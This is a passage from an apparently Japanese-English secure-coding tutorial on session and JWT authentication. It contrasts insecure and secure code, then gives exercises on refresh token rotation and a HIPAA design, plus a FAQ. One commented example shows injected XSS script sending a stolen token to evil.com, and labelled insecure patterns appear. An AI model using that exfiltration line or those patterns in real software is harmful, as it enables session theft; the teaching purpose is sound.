  const response = await fetch('/api/auth/login', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
  });
  const { token } = await response.json();

  // NG: localStorage に保存 → XSS で簡単に窃取される
  localStorage.setItem('access_token', token);
}

// XSS 攻撃者が以下のスクリプトを注入するだけで窃取可能:
// const token = localStorage.getItem('access_token');
// fetch('https://evil.com/steal', { method: 'POST', body: token });
```

```typescript
// OK: HttpOnly Cookie に保存（サーバー側で設定）
async function loginGood(email: string, password: string) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
    credentials: 'include', // Cookie を受け取る
  });

  if (!response.ok) throw new Error('Login failed');
  // トークンは HttpOnly Cookie でサーバーが設定済み
  // JavaScript からは見えない → XSS で窃取不可能
  return response.json(); // ユーザー情報のみ返却
}
```

### 8.2 NG: Not Setting Algorithm Restrictions for JWT

```typescript
// NG: アルゴリズムを検証しない → alg: "none" 攻撃に脆弱
import jwt from 'jsonwebtoken';

function verifyTokenBad(token: string) {
  // NG: algorithms を指定していない
  return jwt.verify(token, publicKey);
  // 攻撃者が alg を "none" に変更すると署名なしで通る
  // 攻撃者が alg を "HS256" に変更し、公開鍵を秘密鍵として使うと偽造できる
}
```

```typescript
// OK: アルゴリズムを明示的に制限
import { jwtVerify } from 'jose';

async function verifyTokenGood(token: string) {
  const { payload } = await jwtVerify(token, publicKey, {
    algorithms: ['ES256'],          // 許可するアルゴリズムを限定
    issuer: 'https://auth.example.com',
    audience: 'https://api.example.com',
  });
  return payload;
}
```

### 8.3 NG: Including Sensitive Information in JWT

```typescript
// NG: JWT ペイロードに機密情報
const badPayload = {
  sub: 'user_123',
  email: 'alice@example.com',
  password: 'hashed_password_here',  // NG: パスワードハッシュ
  ssn: '123-45-6789',               // NG: 社会保障番号
  creditCard: '4111-1111-1111-1111', // NG: クレジットカード番号
  internalNotes: 'VIP customer',     // NG: 内部メモ
};
// JWT は署名されるが暗号化されない → Base64URL デコードで誰でも読める
```

```typescript
// OK: 必要最小限の情報のみ
const goodPayload = {
  sub: 'user_123',       // ユーザーID
  role: 'admin',         // ロール（認可に必要）
  org_id: 'org_456',     // 組織ID（マルチテナント用）
  // exp, iat, iss, aud はライブラリが設定
};
// 詳細情報が必要な場合は /userinfo API で取得
```

### 8.4 NG: Using Predictable Values for Session IDs

```typescript
// NG: 予測可能なセッション ID
function generateSessionIdBad(): string {
  // NG: シーケンシャルな ID → 推測可能
  return `session_${Date.now()}`;
  // NG: Math.random() → 暗号的に安全ではない
  // return `session_${Math.random().toString(36)}`;
}
```

```typescript
// OK: 暗号的に安全なランダム値
import crypto from 'crypto';

function generateSessionIdGood(): string {
  // 32バイト = 256ビットの暗号ランダム値
  return crypto.randomBytes(32).toString('hex');
  // 結果例: "a3f2b8c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1"
}
```

---

## 9. Practice Exercises

### Exercise 1: Basic — Identifying Session-Based vs Token-Based Approaches

Look at the following HTTP requests/responses and determine whether each uses a session-based or token-based approach, explaining your reasoning.

**Case A:**
```
POST /api/login HTTP/1.1
Content-Type: application/json

{"email": "alice@example.com", "password": "secret123"}

---
HTTP/1.1 200 OK
Set-Cookie: sid=a1b2c3d4e5; HttpOnly; Secure; SameSite=Lax

{"message": "Login successful"}
```

**Case B:**
```
POST /api/login HTTP/1.1
Content-Type: application/json

{"email": "alice@example.com", "password": "secret123"}

---
HTTP/1.1 200 OK
Content-Type: application/json

{"access_token": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9...", "token_type": "Bearer", "expires_in": 900}
```

**Case C:**
```
POST /api/login HTTP/1.1
Content-Type: application/json

{"email": "alice@example.com", "password": "secret123"}

---
HTTP/1.1 200 OK
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; HttpOnly; Secure; SameSite=Lax

{"message": "Login successful"}
```

<details>
<summary>Model Answer</summary>

**Case A: Session-based approach**
- Reason: `Set-Cookie: sid=a1b2c3d4e5` sets a random session ID in a Cookie
- The session ID is merely a pointer; the actual authentication data is stored server-side
- The response body does not include a token

**Case B: Token-based approach (pure JWT)**
- Reason: The response body returns an `access_token` (JWT format)
- `token_type: "Bearer"` indicates it should be sent via the Authorization header
- `expires_in: 900` is a 900-second (15-minute) expiry
- No Cookie is used → the client manages the token

**Case C: Hybrid approach**
- Reason: A JWT-format token (`eyJ...`) is set in an HttpOnly Cookie
- Combines JWT's self-contained verification with the XSS resistance of Cookies
- The response body does not include a token (inaccessible from JavaScript)
- The most recommended approach

</details>

### Exercise 2: Applied — Implementing Refresh Token Rotation

Implement a Refresh Token Rotation mechanism that satisfies the following specification.

**Specification:**
1. Access Token expiry: 15 minutes
2. Refresh Token expiry: 7 days
3. A new Refresh Token is issued each time a Refresh Token is used
4. If a used Refresh Token is reused, invalidate all tokens in the same family
5. Store Refresh Tokens in the DB after hashing

<details>
<summary>Model Answer</summary>

```typescript
import crypto from 'crypto';
import { SignJWT, jwtVerify } from 'jose';

// DB スキーマ（Prisma）
// model RefreshToken {
//   id        String   @id @default(cuid())
//   token     String   @unique    // SHA-256 ハッシュ
//   userId    String
//   family    String              // トークンファミリー
//   used      Boolean  @default(false)
//   expiresAt DateTime
//   createdAt DateTime @default(now())
//   user      User     @relation(fields: [userId], references: [id])
//   @@index([family])
//   @@index([userId])
// }

const JWT_SECRET = new TextEncoder().encode(process.env.JWT_SECRET!);

class TokenService {
  // Access Token 発行
  async issueAccessToken(userId: string, role: string): Promise<string> {
    return new SignJWT({ sub: userId, role })
      .setProtectedHeader({ alg: 'HS256' })
      .setIssuedAt()
      .setExpirationTime('15m')
      .setJti(crypto.randomUUID())
      .sign(JWT_SECRET);
  }

  // Refresh Token 発行
  async issueRefreshToken(userId: string, family?: string): Promise<string> {
    const rawToken = crypto.randomBytes(32).toString('hex');
    const hashedToken = this.hashToken(rawToken);

    await prisma.refreshToken.create({
      data: {
        token: hashedToken,
        userId,
        family: family || crypto.randomUUID(),
        used: false,
        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
      },
    });

    return rawToken;
  }

  // トークンリフレッシュ（Rotation 付き）
  async refresh(rawRefreshToken: string): Promise<{
    accessToken: string;
    refreshToken: string;
  }> {
    const hashedToken = this.hashToken(rawRefreshToken);

    const record = await prisma.refreshToken.findUnique({
      where: { token: hashedToken },
      include: { user: true },
    });

    // 存在しない or 期限切れ
    if (!record || record.expiresAt < new Date()) {
      throw new Error('Invalid refresh token');
    }

    // 再利用検知 → 全ファミリー無効化
    if (record.used) {
      await prisma.refreshToken.deleteMany({
        where: { family: record.family },
      });
      console.warn(`[SECURITY] Refresh token reuse detected for user ${record.userId}`);
      throw new Error('Token reuse detected - all sessions in family revoked');
    }

    // 使用済みにマーク
    await prisma.refreshToken.update({
      where: { token: hashedToken },
      data: { used: true },
    });

    // 新しいトークンペアを発行
    const accessToken = await this.issueAccessToken(record.userId, record.user.role);
    const refreshToken = await this.issueRefreshToken(record.userId, record.family);

    return { accessToken, refreshToken };
  }

  // ログアウト（ファミリー全体を無効化）
  async revokeFamily(rawRefreshToken: string): Promise<void> {
    const hashedToken = this.hashToken(rawRefreshToken);
    const record = await prisma.refreshToken.findUnique({
      where: { token: hashedToken },
    });

    if (record) {
      await prisma.refreshToken.deleteMany({
        where: { family: record.family },
      });
    }
  }

  // 全セッション無効化
  async revokeAllForUser(userId: string): Promise<void> {
    await prisma.refreshToken.deleteMany({ where: { userId } });
  }

  private hashToken(token: string): string {
    return crypto.createHash('sha256').update(token).digest('hex');
  }
}
```

**Key design points:**

1. **Family ID**: Tracks all Refresh Tokens generated from the same login session
2. **Reuse detection**: The `used` flag detects reuse of an already-consumed token
3. **Hashed storage**: Only the hash value is stored in the DB (reduces damage from DB leaks)
4. **Invalidate entire family**: If one token is misused, all related tokens are deleted

</details>

### Exercise 3: Advanced — Designing an Authentication Approach Based on Security Requirements

Based on the system requirements below, design the optimal authentication approach and explain your reasoning technically.

**System requirements:**
- Healthcare SaaS application (HIPAA compliance required)
- Frontend: React SPA
- Backend: Microservices (3 services)
- Mobile app: iOS / Android
- Requirements: Immediate session revocation, audit logging, 15-minute inactivity timeout
- User scale: 10,000 users
- Availability: 99.9%

Include the following in your design document:
1. Authentication approach selection and rationale
2. Token/session storage locations
3. Expiry design
4. Revocation strategy
5. Scaling strategy

<details>
<summary>Model Answer</summary>

### 1. Authentication Approach Selection

**Adopt a hybrid approach (JWT + server-side validation).**

Rationale:
- HIPAA compliance requires immediate revocation → pure JWT (stateless) alone is insufficient
- JWT self-contained verification is efficient for inter-microservice communication
- JWT-based flows are appropriate for mobile support

Specific design:
```
[Web SPA] → BFF（Backend for Frontend）→ [マイクロサービス群]
                                           ├─ Patient Service
                                           ├─ Appointment Service
                                           └─ Records Service

[Mobile App] → API Gateway → [マイクロサービス群]
```

### 2. Token/Session Storage Locations

**Web SPA:**
- Access Token: JWT stored in BFF's HttpOnly Cookie
- Refresh Token: HttpOnly Cookie (Strict, restricted path)
- The SPA itself holds no tokens → maximum XSS resistance

**Mobile App:**
- Access Token: iOS Keychain / Android Keystore
- Refresh Token: Same (OS-level secure storage)

**Inter-microservice:**
- Short-lived JWT (5 min) for authentication
- Combined with mTLS to protect the communication channel

### 3. Expiry Design

```
Access Token:   15 minutes (meets HIPAA inactivity timeout requirement)
Refresh Token:  8 hours (within business hours)
                ※ "Stay logged in" option is not offered (HIPAA requirement)
```

### 4. Revocation Strategy

**Redis-based Token Version + blacklist combination:**
```
Normal revocation:     Natural expiry via short Access Token lifetime (15 min)
Immediate revocation:  Redis blacklist (jti-based)
All sessions:          Token Version increment (DB + Redis cache)
```

**Audit logging:**
```
Login / logout / token refresh / revocation / unauthorized access detection
→ All recorded in audit logs (DynamoDB or CloudWatch Logs)
→ HIPAA requirement: retained for at least 6 years
```

### 5. Scaling Strategy

```
Redis:         Redis Cluster (3 nodes, multi-AZ)
               → Blacklist + Token Version cache
               → Guarantees 99.9% availability

BFF:           Horizontal scaling (ECS/EKS, minimum 3 instances)
               → JWT verification is stateless; only Redis is referenced

API Gateway:   AWS API Gateway or Kong
               → JWT verification performed at the gateway level
               → Reduces load on each microservice

Key management: Signing keys managed with AWS KMS
               → ES256 (elliptic curve cryptography)
               → Automatic rotation every 90 days
```

**Why this design is optimal:**
1. Meets HIPAA's immediate revocation requirement with Redis blacklist
2. Ensures microservice independence via JWT self-contained verification
3. Maximizes web XSS resistance with BFF + HttpOnly Cookie
4. Supports mobile with JWT + Secure Storage
5. Achieves 99.9% availability with Redis Cluster + horizontal scaling

</details>

---

## 10. FAQ

### Q1: Which is "more secure" — session-based or JWT?

**A:** There is no simple answer to which is "more secure." The security characteristics differ.

- **Session-based** is strong in "immediate revocation" and provides high **management security**
- **Token-based** is strong in "tamper detection" and provides high **transmission security**

In practice, the storage location (HttpOnly Cookie vs localStorage) and implementation quality determine security. A hybrid that stores JWT in an HttpOnly Cookie makes the most of both approaches' advantages.

### Q2: What is the optimal expiry duration for a JWT?

**A:** It depends on the nature of the application.

| App Type | Access Token | Refresh Token |
|-----------|-------------|---------------|
| General web | 15 min | 7 days |
| Finance / Healthcare | 5–15 min | 8 hours |
| Social media | 1 hour | 30 days |
| IoT devices | 1 hour | 90 days |
| Inter-microservice | 5 min | None |

Too short and refreshes become too frequent, degrading UX. Too long and security risks increase. 15 minutes is generally considered a good balance.

### Q3: Is a Refresh Token truly necessary?

**A:** Long-term sessions cannot be maintained securely with an Access Token alone, so it is essentially required.

Without a Refresh Token:
- Lengthen Access Token expiry → increased risk on theft
- Shorten Access Token expiry → users must frequently re-login

With a Refresh Token:
- Keep Access Token short-lived for security
- Update tokens transparently with the Refresh Token
- Rotation makes Refresh Token theft detectable

### Q4: Can SameSite Cookie alone prevent CSRF?

**A:** SameSite=Lax prevents major CSRF attacks, but is not complete.

What it prevents:
- Automatic submission of `<form method="POST">`
- Requests from `<img>`, `<iframe>`
- Cross-site requests from `fetch()` / `XMLHttpRequest`

What it does not prevent:
- Attacks from subdomains (treated as same-site)
- State changes via GET requests (an API design issue)
- Old browsers that do not support SameSite

Recommendation: Combine SameSite=Lax with Origin header validation.

### Q5: What happens when the session store goes down?

**A:** In the session-based approach, the store becomes a SPOF (single point of failure). Mitigations:

1. **Redis Sentinel**: Automatic failover for high availability (99.99%)
2. **Redis Cluster**: Horizontal scaling + automatic sharding
3. **Multi-region**: Active-Active replication
4. **Fallback**: Gracefully prompt new login when the store is unavailable

With JWT, no store is needed — but if Redis is used for blacklisting/Token Version, the same problem arises. Completely stateless operation requires accepting the trade-off of "no immediate revocation."

---


## FAQ

### Q1: What is the most important point when learning this topic?

Gaining practical experience is most important. Understanding deepens not only through theory, but by actually writing code and verifying behavior.

### Q2: What mistakes do beginners commonly make?

Skipping the fundamentals and jumping to advanced topics. We recommend thoroughly understanding the basic concepts explained in this guide before moving on to the next step.

### Q3: How is this used in practice?

Knowledge of this topic is frequently used in day-to-day development work. It becomes especially important during code reviews and architecture design.

---

## Summary

### Overall Comparison Table by Approach

| Approach | Best Use Case | Security | Scalability | Implementation Difficulty | Notes |
|------|----------|------------|---------|---------|--------|
| Session | MPA, when immediate revocation is required | ○ High | △ Store-dependent | Low | CSRF mitigation required; store management |
| JWT (Bearer) | Mobile, inter-API communication | △ Depends on storage | ◎ Easy | Medium | Immediate revocation is difficult; large size |
| JWT + Cookie | Next.js, SPA | ◎ Most secure | ○ Good | Medium | Cookie size limit; same domain |
| Refresh Token | Long-term session maintenance | ○ Requires Rotation | ○ Good | High | Rotation is mandatory |

### Principles for Selection

```
1. For browser apps, HttpOnly Cookie is the top priority
2. Do not store tokens in localStorage
3. Keep Access Tokens short-lived (15 minutes or less)
4. Always implement Refresh Token Rotation
5. Explicitly specify the algorithm allowlist
6. Do not include sensitive information in the JWT payload
7. When in doubt, choose the hybrid approach (JWT in HttpOnly Cookie)
```

---

## What to Read Next

| Next Topic | Link |
|-------------|--------|
| Cookies and session management | [01-session-auth/00-cookie-and-session.md](../01-session-auth/00-cookie-and-session.md) |
| Session store | [01-session-auth/01-session-store.md](../01-session-auth/01-session-store.md) |
| CSRF defense | [01-session-auth/02-csrf-protection.md](../01-session-auth/02-csrf-protection.md) |
| JWT deep dive | [02-token-auth/00-jwt-deep-dive.md](../02-token-auth/00-jwt-deep-dive.md) |
| OAuth 2.0 flows | [02-token-auth/01-oauth2-flows.md](../02-token-auth/01-oauth2-flows.md) |
| Security fundamentals | security-fundamentals/00-basics/ |

---

## References

1. OWASP. "Session Management Cheat Sheet." cheatsheetseries.owasp.org, 2024.
2. OWASP. "JSON Web Token Cheat Sheet." cheatsheetseries.owasp.org, 2024.
3. Auth0. "Token Storage." auth0.com/docs, 2024.
4. Auth0. "Token Best Practices." auth0.com/docs, 2024.
5. RFC 6750. "The OAuth 2.0 Authorization Framework: Bearer Token Usage." IETF, 2012.
6. RFC 7519. "JSON Web Token (JWT)." IETF, 2015.
7. Okta. "Why You Should Not Use localStorage for Authentication Tokens." developer.okta.com, 2023.
8. Philippe De Ryck. "The Pitfalls of OAuth and OIDC in SPAs." pragmaticwebsecurity.com, 2023.
